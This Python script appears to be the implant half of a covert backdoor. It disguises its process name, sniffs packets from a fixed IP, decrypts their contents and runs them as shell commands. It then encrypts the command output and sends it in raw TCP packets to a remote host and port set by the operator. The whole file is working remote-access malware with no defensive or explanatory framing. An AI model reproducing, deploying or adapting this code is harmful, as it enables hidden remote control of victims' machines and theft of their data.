#!/usr/bin/env python3


from scapy.all import *
import subprocess
import setproctitle
import time
import argparse
import encrypt_utils as utils


parser = argparse.ArgumentParser()

parser.add_argument("-d",
                    "--destination",
                    type=str,
                    help="IP of remote host, to display output to",
                    required=True)

parser.add_argument("-p",
                    "--port",
                    type=str,
                    help="Port of remote host",
                    required=True)

parser.add_argument("-n",
                    "--name",
                    type=str,
                    help="Process name of this app while running",
                    required=True)                    

global args
args = parser.parse_args()

setproctitle.setproctitle(args.name)


def read_pkt(packet):
    data = packet[Raw].load
    decrypted_data = utils.decrypt_data(data)

    exec_command(decrypted_data)


def exec_command(command):
    if command == b":q":
        print("Shutdown received from remote client...")
        sys.exit()
    else:
        cmd = subprocess.Popen(command.decode("utf-8"), 
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE)

        out, errs = cmd.communicate()
        output = out + errs

        if output.strip() == b"":
            output = (command.decode("utf-8") + " : no output on remote\n").encode("utf-8")

        # Encrypt output
        output = utils.encrypt_data(output)

        # Send output back to remote client
        pkt = IP(dst=args.destination)/TCP(sport=RandShort(), dport=int(args.port))/Raw(load=output)
        time.sleep(0.1)
        send(pkt, verbose=False)


def main():
    print("Listening...\n")

    while True:
        sniff(filter="ip and tcp and host 192.168.1.79", count=1, prn=read_pkt)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Exiting program...")
        sys.exit()
